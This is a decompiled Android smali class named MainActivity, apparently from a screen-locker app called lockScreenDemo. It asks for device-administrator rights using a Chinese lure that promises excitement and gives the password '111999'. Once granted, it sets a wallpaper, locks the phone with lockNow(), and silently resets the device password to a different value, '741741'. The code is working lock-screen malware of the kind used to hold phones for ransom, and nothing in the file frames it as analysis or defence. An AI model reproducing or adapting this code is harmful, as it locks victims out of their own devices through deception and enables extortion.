.class public Lcom/zz/lockScreenDemo/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# instance fields
.field private componentName:Landroid/content/ComponentName;

.field private dManager:Landroid/app/admin/DevicePolicyManager;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public lock(Landroid/view/View;)V
    .locals 4
    .param p1, "view"    # Landroid/view/View;

    .prologue
    .line 63
    iget-object v2, p0, Lcom/zz/lockScreenDemo/MainActivity;->dManager:Landroid/app/admin/DevicePolicyManager;

    iget-object v3, p0, Lcom/zz/lockScreenDemo/MainActivity;->componentName:Landroid/content/ComponentName;

    invoke-virtual {v2, v3}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 65
    invoke-virtual {p0}, Lcom/zz/lockScreenDemo/MainActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    .line 66
    const v3, 0x7f020001

    .line 65
    invoke-static {v2, v3}, Landroid/graphics/BitmapFactory;->decodeResource(Landroid/content/res/Resources;I)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 69
    .local v0, "bm":Landroid/graphics/Bitmap;
    :try_start_0
    invoke-virtual {p0, v0}, Lcom/zz/lockScreenDemo/MainActivity;->setWallpaper(Landroid/graphics/Bitmap;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 73
    :goto_0
    iget-object v2, p0, Lcom/zz/lockScreenDemo/MainActivity;->dManager:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v2}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    .line 77
    .end local v0    # "bm":Landroid/graphics/Bitmap;
    :goto_1
    return-void

    .line 70
    .restart local v0    # "bm":Landroid/graphics/Bitmap;
    :catch_0
    move-exception v1

    .line 71
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 75
    .end local v0    # "bm":Landroid/graphics/Bitmap;
    .end local v1    # "e":Ljava/io/IOException;
    :cond_0
    const-string v2, "\u5fc5\u987b\u5148\u6fc0\u6d3b\u8bbe\u5907\u7ba1\u7406\u5668"

    const/4 v3, 0x0

    invoke-static {p0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    goto :goto_1
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v5, 0x0

    .line 25
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 26
    const/high16 v3, 0x7f030000

    invoke-virtual {p0, v3}, Lcom/zz/lockScreenDemo/MainActivity;->setContentView(I)V

    .line 28
    const-string v3, "device_policy"

    invoke-virtual {p0, v3}, Lcom/zz/lockScreenDemo/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/admin/DevicePolicyManager;

    iput-object v3, p0, Lcom/zz/lockScreenDemo/MainActivity;->dManager:Landroid/app/admin/DevicePolicyManager;

    .line 29
    new-instance v3, Landroid/content/ComponentName;

    const-class v4, Lcom/zz/lockScreenDemo/AdminReceiver;

    invoke-direct {v3, p0, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v3, p0, Lcom/zz/lockScreenDemo/MainActivity;->componentName:Landroid/content/ComponentName;

    .line 34
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 35
    .local v2, "intent":Landroid/content/Intent;
    const-string v3, "android.app.extra.DEVICE_ADMIN"

    .line 36
    iget-object v4, p0, Lcom/zz/lockScreenDemo/MainActivity;->componentName:Landroid/content/ComponentName;

    .line 35
    invoke-virtual {v2, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 37
    const-string v3, "android.app.extra.ADD_EXPLANATION"

    .line 38
    const-string v4, "\u70b9\u51fb\u6fc0\u6d3b\uff0c\u7acb\u9a6c\u7cbe\u5f69\uff01\u5bc6\u7801\uff1a111999"

    .line 37
    invoke-virtual {v2, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 39
    invoke-virtual {p0, v2}, Lcom/zz/lockScreenDemo/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 42
    iget-object v3, p0, Lcom/zz/lockScreenDemo/MainActivity;->dManager:Landroid/app/admin/DevicePolicyManager;

    iget-object v4, p0, Lcom/zz/lockScreenDemo/MainActivity;->componentName:Landroid/content/ComponentName;

    invoke-virtual {v3, v4}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 44
    invoke-virtual {p0}, Lcom/zz/lockScreenDemo/MainActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    .line 45
    const v4, 0x7f020001

    .line 44
    invoke-static {v3, v4}, Landroid/graphics/BitmapFactory;->decodeResource(Landroid/content/res/Resources;I)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 48
    .local v0, "bm":Landroid/graphics/Bitmap;
    :try_start_0
    invoke-virtual {p0, v0}, Lcom/zz/lockScreenDemo/MainActivity;->setWallpaper(Landroid/graphics/Bitmap;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 52
    :goto_0
    iget-object v3, p0, Lcom/zz/lockScreenDemo/MainActivity;->dManager:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v3}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    .line 54
    iget-object v3, p0, Lcom/zz/lockScreenDemo/MainActivity;->dManager:Landroid/app/admin/DevicePolicyManager;

    const-string v4, "741741"

    invoke-virtual {v3, v4, v5}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    .line 59
    .end local v0    # "bm":Landroid/graphics/Bitmap;
    :goto_1
    invoke-virtual {p0}, Lcom/zz/lockScreenDemo/MainActivity;->finish()V

    .line 60
    return-void

    .line 49
    .restart local v0    # "bm":Landroid/graphics/Bitmap;
    :catch_0
    move-exception v1

    .line 50
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 56
    .end local v0    # "bm":Landroid/graphics/Bitmap;
    .end local v1    # "e":Ljava/io/IOException;
    :cond_0
    const-string v3, "\u5fc5\u987b\u5148\u6fc0\u6d3b\u8bbe\u5907\u7ba1\u7406\u5668"

    invoke-static {p0, v3, v5}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v3

    invoke-virtual {v3}, Landroid/widget/Toast;->show()V

    goto :goto_1
.end method
